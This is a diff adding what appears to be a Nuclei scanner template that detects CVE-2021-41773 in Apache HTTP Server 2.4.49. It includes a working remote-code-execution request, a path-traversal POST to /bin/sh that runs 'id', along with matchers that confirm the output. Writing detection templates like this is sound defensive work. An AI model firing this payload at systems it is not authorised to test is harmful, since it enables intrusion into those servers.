@@ -1,0 +1,41 @@
+id: apache-httpd-rce
+
+info:
+  name: Apache HTTPd - 2.4.49 (CGI enabled) RCE
+  author: pdteam
+  severity: critical
+  description: A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by require all denied these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
+  reference:
+    - https://github.com/apache/httpd/commit/e150697086e70c552b2588f369f2d17815cb1782
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-41773
+    - https://twitter.com/ptswarm/status/1445376079548624899
+    - https://github.com/blasty/CVE-2021-41773
+  tags: cve,cve2021,rce,apache
+
+requests:
+  - raw:
+      - |
+        POST /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        echo Content-Type: text/plain; echo; id
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        condition: and
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
+          - 'groups='
+
+    extractors:
+      - type: regex
+        regex:
+          - "(u|g)id=.*"
